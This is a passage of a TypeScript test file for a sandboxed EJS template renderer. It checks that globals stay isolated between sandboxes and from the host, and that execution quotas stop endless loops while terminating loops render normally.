    expect(await safeRenderClient('<%= typeof Math.leaked %>', {})).toEqual('undefined');
    await shutdownSafeEjsPool();
  });
});

describe('check createSafeEjsSandbox', () => {
  it('should share globals between renders of the same sandbox', async () => {
    const sandbox = createSafeEjsSandbox();
    expect(await sandbox.safeRender("<% Math.shared = 'same-sandbox' %>ok", {})).toEqual('ok');
    expect(await sandbox.safeRender('<%= Math.shared %>', {})).toEqual('same-sandbox');
  });

  it('should not share globals between two sandboxes', async () => {
    const first = createSafeEjsSandbox();
    const second = createSafeEjsSandbox();
    expect(await first.safeRender("<% Math.shared = 'first-sandbox' %>ok", {})).toEqual('ok');
    expect(await second.safeRender('<%= typeof Math.shared %>', {})).toEqual('undefined');
  });

  it('should not leak a write made in a sandbox into the host', async () => {
    const sandbox = createSafeEjsSandbox();
    await sandbox.safeRender("<% JSON.leakedToHost = 'escaped' %>ok", {});
    expect((JSON as Record<string, any>).leakedToHost).toBeUndefined();
  });

  it('should enforce quotas on every render of a sandbox', async () => {
    const sandbox = createSafeEjsSandbox();
    const quotas = { maxExecutedStatementCount: 100 };
    expect(await sandbox.safeRender('<% let i=0; while(i<10) i=i+1; %><%= i %>', {}, quotas)).toEqual('10');
    expect(() => sandbox.safeRender('<% while(true); %>', {}, quotas)).toThrow(VerifierProcessingQuotaExceededError);
    expect(await sandbox.safeRender('<%= 1 + 1 %>', {}, quotas)).toEqual('2');
  });
});

describe('check loop execution quotas', () => {
  const QUOTAS = { delimiter: '?', async: true, maxExecutedStatementCount: 10000, maxExecutionDuration: 2000 } as any;

  it.each([
    ['while without a body', '<? while(true); ?>'],
    ['while with a single statement', '<? let i=0; while(true) i=i+1; ?>'],
    ['while with a block', '<? let i=0; while(true) { i=i+1; } ?>'],
    ['do while', '<? do; while(true); ?>'],
    ['for without any slot', '<? for(;;); ?>'],
    ['for with a declared initialiser', '<? let x=0; for(let i=0;;) { x=x+1; } ?>'],
    ['for with an assigned initialiser', '<? let i=0; for(i=0;;) { i=i+1; } ?>'],
    ['for with an update only', '<? let i=0; for(;;i=i+1) { } ?>'],
    ['for-of no-brace body growing the iterable', '<? let a=[1]; for (const x of a) a.push(1); ?>'],
    ['for with a declared initialiser, empty condition and no-brace body', '<? for (let i=0;;i+=1) i+=1; ?>'],
  ])('should stop an endless %s', async (_label, template) => {
    await expect(safeRender(template, {}, QUOTAS)).rejects.toThrow(VerifierProcessingQuotaExceededError);
  });

  it.each([
    ['while without a body', '<? while(true); ?>'],
    ['for without any slot', '<? for(;;); ?>'],
    ['while with a block', '<? let i=0; while(true) { i=i+1; } ?>'],
  ])('should stop an endless %s rendered through the worker pool', async (_label, template) => {
    // The pool timeout is well above the quota, so only the quota can stop the loop in time.
    await expect(safeRenderClient(template, {}, { ...QUOTAS, timeout: 30000 }))
      .rejects.toThrow(/Max (executed statement count|execution duration) exceeded/);
    expect(await safeRenderClient('<?= it.value ?>', { it: { value: 'after quota' } }, { delimiter: '?' })).toEqual('after quota');
  });

  it.each([
    ['declared initialiser', '<? let s=0; for(let i=0;i<3;i=i+1) { s=s+i; } ?><?= s ?>', '3'],
    ['assigned initialiser', '<? let s=0; let i; for(i=0;i<3;i=i+1) { s=s+i; } ?><?= s ?>', '3'],
    ['no initialiser', '<? let s=0; let i=0; for(;i<3;i=i+1) { s=s+i; } ?><?= s ?>', '3'],
    ['no braces', '<? let s=0; for(let i=0;i<3;i=i+1) s=s+i; ?><?= s ?>', '3'],
    ['for of', '<? let s=0; for(const x of [1,2,3]) { s=s+x; } ?><?= s ?>', '6'],
    ['for-of no braces', '<? let s=0; for (const x of [1,2,3]) s=s+x; ?><?= s ?>', '6'],
    ['for-in no braces', '<? let s=0; const o={ a:1, b:2 }; for (const k in o) s=s+o[k]; ?><?= s ?>', '3'],
    ['while', '<? let s=0; let i=0; while(i<3) { s=s+i; i=i+1; } ?><?= s ?>', '3'],
  ])('should leave a terminating loop with a %s alone', async (_label, template, expected) => {
    expect(await safeRender(template, {}, QUOTAS)).toEqual(expected);
  });

  it('renders a nested synchronous function in async mode', async () => {
    expect(await safeRender('<? function f(){ return 1; } ?><?= f() ?>', {}, QUOTAS)).toEqual('1');
    expect(await safeRender('<? const g = () => 2; ?><?= g() ?>', {}, QUOTAS)).toEqual('2');
  });

  afterAll(async () => {
    await shutdownSafeEjsPool();
  });
});
